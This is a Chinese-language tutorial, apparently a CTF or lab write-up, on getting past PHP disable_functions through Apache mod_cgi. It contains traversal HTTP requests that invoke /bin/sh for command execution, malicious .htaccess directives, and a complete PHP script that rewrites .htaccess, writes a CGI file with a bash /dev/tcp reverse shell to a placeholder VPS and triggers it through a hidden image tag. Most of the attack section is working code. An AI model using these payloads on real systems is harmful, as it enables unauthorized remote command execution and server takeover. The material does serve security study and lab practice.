## Apache Mod CGI 提权

当 Apache 配置中启用了以下内容时：

```bash
<Directory />
	# 表示允许所有用户（包括匿名用户）访问此目录及其子目录，没有任何限制
    Require all granted
</Directory>
```

再配合 `mod_cgi` 模块，攻击者可以构造特殊的 URL 请求，如：

```bash
GET /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1
Host: victim.com
```

`%2e` 是 URL 编码的 `.`，这导致路径解析出错，绕过了限制

利用该路径访问系统中的 `sh` 或其他解释器，附带参数来执行任意命令

例如：

```bash
POST /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1
Host: vulnerable.com
Content-Length: 46
Content-Type: application/x-www-form-urlencoded

echo; echo "Content-Type: text/plain"; echo; id
```

输出将是 CGI 响应中的用户身份，即已执行系统命令

当你在 `php.ini` 中配置：

```ini
disable_functions = system, exec, shell_exec, passthru
```

这只是让 PHP 解释器在运行 `.php` 脚本时**不允许调用这些函数**，防止 PHP 代码执行系统命令

⚠️ 但前提是——**必须通过 PHP 来运行的代码才会受这个配置限制**

当你启用了 Apache 的 `mod_cgi` 模块后，它的工作方式是：

- 用户请求 `example.com/cgi-bin/exploit.sh`
- Apache 检查该文件是可执行文件（比如 `/bin/sh` 脚本）
- Apache 启动新子进程，直接使用操作系统运行该脚本（不是交给 PHP）

这时，**不会加载 PHP，也不会执行 `php.ini` 的配置逻辑**

```
正常 PHP RCE 情况下：
浏览器 --> Apache --> PHP --> 你的脚本
                            |
                            └→ system(), 被 disable_functions 禁用

而 mod_cgi 情况下：
浏览器 --> Apache --> 直接执行 /bin/sh（绕过 PHP）
                        |
                        └→ 任意命令被执行（无任何语言级限制）
```

点击重置后门目录

![](https://pic1.imgdb.cn/item/6880c70658cb8da5c8d0dde5.png)

点击 GetFlag 进入到后门，默认 index.php

![](https://pic1.imgdb.cn/item/6880c73d58cb8da5c8d0df4c.png)

右键插件选择好对应的模式

![](https://pic1.imgdb.cn/item/6880c7b558cb8da5c8d0e21f.png)

点击开始后如果条件没问题就会弹终端出来

![](https://pic1.imgdb.cn/item/6880cc5958cb8da5c8d0f78a.png)

![](https://pic1.imgdb.cn/item/6880cd1958cb8da5c8d0fab5.png)

手动的话需要先上传一个 `.htaccess` 文件，[参考博客](https://www.cnblogs.com/EddieMurphy-blogs/p/18188088)

```htaccess
# 允许当前目录中的 CGI（Common Gateway Interface）脚本被执行
Options +ExecCGI

# 将所有以 .eddie 结尾的文件视为 CGI 脚本（可执行文件）
# 即用户访问 example.com/script.eddie 时，Apache 会尝试执行它而不是当作普通文件输出
AddHandler cgi-script .eddie
```

反弹 shell 的 `shell.eddie` 文件

```bash
#!/bin/bash
# 输出 HTTP 响应头，告知浏览器这是 HTML 内容
echo -ne "Content-Type: text/html\n\n"

# 执行 ls 命令列出当前目录，并用 echo 输出
echo && ls
```

`eddie.php` 文件

```php
<?php
// 要执行的反弹 shell 命令（将 bash shell 连接到远程 VPS 的指定端口）
$cmd = "bash -i >& /dev/tcp/vps/port 0>&1";

// 创建 CGI 脚本的内容（bash 脚本）
$shellfile = "#!/bin/bash\n"; // 指定使用 bash 解释器
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; // 输出 HTTP 响应头，防止服务器抛出 500 错误
$shellfile .= "$cmd"; // 添加反弹 shell 命令到脚本中

// 输出检查结果的函数（是否满足条件）
function checkEnabled($text, $condition, $yes, $no)
{
    echo "$text: " . ($condition ? $yes : $no) . "<br>\n"; // 根据条件输出结果
}

// 如果没有设置 ?checked=true 参数，则首次访问时进入该分支
if (!isset($_GET['checked']))
{
    // 向当前目录下的 .htaccess 文件添加一行 SetEnv 指令（检测是否允许使用 .htaccess）
    @file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND);

    // 重定向到自身，加上 ?checked=true 参数，进入下一阶段检测
    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true');
}
else
{
    // 检查服务器是否启用了 mod_cgi 模块
    $modcgi = in_array('mod_cgi', apache_get_modules());

    // 检查当前目录是否有写权限
    $writable = is_writable('.');

    // 检查 .htaccess 文件是否生效（通过前面写入的 SetEnv 决定）
    $htaccess = !empty($_SERVER['HTACCESS']);

    // 显示三个条件的检测结果
    checkEnabled("Mod-Cgi 是否启用", $modcgi, "是", "否");
    checkEnabled("当前目录是否可写", $writable, "是", "否");
    checkEnabled(".htaccess 是否生效", $htaccess, "是", "否");

    // 如果有任一条件不满足，则退出执行
    if (!($modcgi && $writable && $htaccess))
    {
        echo "错误：上述所有条件都必须满足脚本才可工作！";
    }
    else
    {
        // 备份 .htaccess 文件（以防出错）
        checkEnabled("备份 .htaccess 文件", copy(".htaccess", ".htaccess.bak"), "成功！已保存为 .htaccess.bak", "失败！");

        // 写入新的 .htaccess 内容：启用 ExecCGI，并将 .dizzle 后缀当作 CGI 脚本处理
        checkEnabled("写入 .htaccess 文件", file_put_contents('.htaccess', "Options +ExecCGI\nAddHandler cgi-script .dizzle"), "成功！", "失败！");

        // 写入反弹 shell 脚本，扩展名为 .dizzle（便于伪装或绕过上传限制）
        checkEnabled("写入 shell 文件", file_put_contents('shell.dizzle', $shellfile), "成功！", "失败！");

        // 将 shell.dizzle 文件设置为 777 权限（可执行）
        checkEnabled("设置权限为 777", chmod("shell.dizzle", 0777), "成功！", "失败！");

        // 触发 shell 脚本的执行（通过 img 标签加载 shell.dizzle，但不显示）
        echo "正在执行脚本，请检查你的监听端口 <img src='shell.dizzle' style='display:none;'>";
    }
}
?>
```

扔到 `backdoor` 目录下面，再直接访问 `eddie.php`

会在目录下生成 `shell.dizzle`，再访问 `shell.dizzle` 就可以成功反弹 shell

![](https://pic1.imgdb.cn/item/68818c0958cb8da5c8d2a119.png)

访问 `eddie.php`

![](https://pic1.imgdb.cn/item/68818cc858cb8da5c8d2aceb.png)

蚁剑中刷新目录可以看到执行成功，多出两个文件

![](https://pic1.imgdb.cn/item/68818dec58cb8da5c8d2c296.png)

![](https://pic1.imgdb.cn/item/68818e0d58cb8da5c8d2c341.png)
